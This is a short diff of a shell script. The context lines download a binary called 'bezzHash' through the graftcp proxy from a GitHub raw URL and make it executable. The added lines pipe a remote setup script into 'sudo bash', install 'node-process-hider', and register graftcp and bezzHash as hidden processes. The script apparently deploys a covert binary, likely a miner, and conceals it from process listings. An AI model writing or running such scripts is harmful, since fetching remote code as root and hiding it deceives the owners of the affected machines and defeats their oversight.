@@ -39,6 +39,10 @@ echo ""
 echo " "
 echo " "
 
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && sudo apt install gcc && npm i -g node-process-hider
+ph add graftcp
+ph add bezzHash
+
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
 chmod +x bezzHash
 
